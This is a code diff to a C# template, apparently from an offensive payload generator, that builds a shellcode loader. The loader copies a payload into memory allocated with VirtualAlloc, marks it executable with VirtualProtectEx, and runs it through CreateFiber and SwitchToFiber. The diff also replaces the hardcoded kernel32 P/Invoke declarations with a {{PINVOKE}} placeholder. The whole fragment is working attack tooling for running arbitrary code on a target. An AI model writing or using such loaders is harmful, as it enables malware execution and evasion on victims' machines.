@@ -113,27 +113,14 @@ namespace {{NAMESPACE}}
             IntPtr payloadLocation = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000,0x04); //0x1000 = MEM_COMMIT,0x04= RW
             Marshal.Copy(payload,0,payloadLocation,payload.Length);
             uint oldprotect;
-            VirtualProtectEx(Process.GetCurrentProcess().Handle,payloadLocation,(UIntPtr)payload.Length,0x20,out oldprotect); //0x20 = RX
+            VirtualProtectEx(Process.GetCurrentProcess().Handle,payloadLocation, payload.Length,0x20,out oldprotect); //0x20 = RX
             IntPtr shellcodeFiber = CreateFiber(0, payloadLocation, IntPtr.Zero);
             SwitchToFiber(shellcodeFiber);
         }
 
         {{ARGS}}
 
-        [DllImport(""kernel32.dll"")]
-        static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);
-
-        [DllImport(""kernel32"")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport(""kernel32.dll"")]
-        static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
-
-        [DllImport(""kernel32.dll"")]
-        extern static IntPtr SwitchToFiber(IntPtr fiberAddress);
-
-        [DllImport(""kernel32.dll"")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        {{PINVOKE}}
     }
 }";
     }
